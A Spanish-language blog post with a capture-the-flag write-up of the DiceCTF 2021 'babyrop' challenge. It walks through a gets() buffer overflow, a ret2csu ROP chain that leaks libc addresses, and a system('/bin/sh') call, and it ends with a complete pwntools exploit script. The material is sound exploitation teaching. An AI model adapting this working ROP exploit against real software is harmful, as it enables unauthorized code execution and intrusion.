---
layout: post
title: diceCTF babyrop
date: 2021-02-09 13:59
comments: true
categories: [Sin categoría]
---

Hola, ya que he decidido migrar mi página github pages,y para pastor este 2021, aprovecharé de hacer un write up de un binario que hice el fin de semana en DICECTF 2021. La parte de pwn estuvo bien buena. Solo alcance a hacer este rop y un heap a medias, pero al menos sirvió para mantener la práctica. 

El binario en cuestión podemos ver que es de 64bit , sin RELRO ni PIE, lo cual hace las cosas bastante sencillas. Eso sí, debemos considerar que probablemente ASLR si está habilitado en el sistema con lo que de todas formas necesitaremos de un leak.

![file](/assets/dice/dice1.png)

Al revisar las funciones vemos que ocupa la función GETS (ya sabemos que esto lleva a buffer overflow), pero solo ocupa adicional a esto la función de ”write” para imprimir en pantalla.


Considerando esto nuestro plan de explotación será el siguiente:

Generar un Overflow y usar ROP para “lekear” una dirección de LIBC
Identificar la version de LIBC
Calcular los offsets necesarios
Volver a generar un Buffer Overflow esta vez llamar a system y obtener una shell


Para obtener el leak el plan es generar un ROP y hacer un llamado a la función de write, podemos observar los parámetros que usa este syscall en el siguiente link. En resumen debemos ubicar en el registro RDI el file descriptor 1 (stdout), la dirección  que queramos “lekear” en RSI (en este caso usaremos la dirección GOT de gets y write) y en el registro RDX debemos darle un valor que usará para definir cuántos bytes se imprimirán en pantalla. Por lo mismo debemos considerar para esto al menos 8 bytes.


Podemos usar “ropper” para mostrar los gadgets del binario y no tener que hacer una búsqueda manual, pero vemos que no hay forma de controlar el valor de rdx, pero! Por eso mismo siempre les recomiendo revisar el binario de manera manual, por que en este caso podemos ocupar una técnica conocida como ret2csu. 

Puedes leer una descripción más detallada acá, pero en resumen usando esta técnica podemos encontrar ciertos “gadgets universales” que nos permiten controlar ciertos registros haciendo uso de estas funciones que siempre se cargan en un ELF producto de la compilación. En este caso usaremos la funcion __lib_vsu_init

Podemos observar que podemos usar un pop al registro R14 en la dirección 0x4011d0 y luego mover con “MOV rdx, r14” en 0x4011b0 el valor al registro RDX. Además el mismo gadget nos permitirá usar R15 y R13 para poder situar los valores de RSI y EDI (4 bytes de RDI).

Para que esto funcione debemos primero agregar los registros necesarios en nuestro “ropchain” de tal m anera que pase el check en 0x4011c4 y hacer que el call, llame a write directamente por lo cual debemos asegurarnos que el valor de write este en  0x4011b9 call   QWORD PTR [ r15+rbx*8 ] 

```
payload = b"A"*0x48 #overflow a los 72 bytes
payload += p64(0x4011ca) #pop a registros
payload += p64(0)#rbx
payload += p64(1)#rbp
payload += p64(1)#r12 --> edi
payload += p64(elf.got.gets) #r13 --> rsi
payload += p64(8)#r14 ---> rdx
payload += p64(elf.got.write) #r15
payload += p64(0x04011b0) # escribiendo en RDX RSI Y EDI
payload += p64(0)*7 # --> los pop nuevamente
payload += p64(elf.sym.main) #para retornar a main y hacer un segundo bof
```

Si enviamos esto podemos lekear las direcciones de gets y write


Con esto podemos buscar una versión de libc remota que coincida y de esa forma podemos calcular los offsets.

Podemos ver que coincide con la versión <> , podríamos descargarla pero dado que esta pagina nos entrega los offset a system y al string de /bin/sh dentro de glibc, pues probaremos con esto en nuestro segundo payload, de la siguiente forma:

```
payload = b"A" * 72 #overflow
payload += p64(poprdi) #pop rdi en el binario
payload += p64(libc.address+0x1b75aa) #string de /bin/sh a RDI como primer arg
payload += p64(ret) #ret para alinear el stack a 16 bytes (ubuntu)
payload += p64(libc.address+0x055410) #direccion de system

```


Con esto ejecutamos y listo! Tenemos una shell.

Espero que les haya gustado, este fue el único exploit que pude terminar en el CTF tuve mucho que hacer y los retos no estaban tan fáciles. Aun asi ya he hechos desafíos para Q4 que ocupan esta técnica, por lo cual me pareció valido mostrar como funciona. Espero les haya gustado, aca les dejo el exploit final:

```
#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./babyrop')
context.terminal = ['tmux', 'splitw', '-hp', '70']
libc = elf.libc

def start():
    if args.GDB:
        return gdb.debug('./babyrop', gdbscript=gs)
    if args.REMOTE:
        return remote('dicec.tf', 31924)
    else:
        return process('./babyrop')
r = start()
r.timeout = 0.3
#========= exploit here ===================

poprdi = 0x4011d3
ret = 0x040116b

payload = b"A"*0x48 #overflow a los 72 bytes
payload += p64(0x4011ca) #pop a registros
payload += p64(0)#rbx
payload += p64(1)#rbp
payload += p64(1)#r12 --> edi
payload += p64(elf.got.gets) #r13 --> rsi
payload += p64(8)#r14 ---> rdx
payload += p64(elf.got.write) #r15
payload += p64(0x04011b0) # escribiendo en RDX RSI Y EDI
payload += p64(0)*7 # --> los pop nuevamente
payload += p64(elf.sym.main) #para retornar a main y hacer un segundo bof

r.sendlineafter("name:", payload)

leak = u64(r.recvuntil("Your").split(b"Your")[0][1:7].ljust(8,b"\x00"))  #remote offset
libc.address = leak - 0x086af0
log.info(f"leak = {hex(leak)}")
log.info(f"libc remote = {hex(libc.address)}")

payload = b"A" * 72 #overflow
payload += p64(poprdi) #pop rdi en el binario
payload += p64(libc.address+0x1b75aa) #string de /bin/sh a RDI como primer arg
payload += p64(ret) #ret para alinear el stack a 16 bytes (ubuntu)
payload += p64(libc.address+0x055410) #direccion de system

r.sendlineafter("name:", payload)  #!!

#========= interactive ====================
r.interactive()
```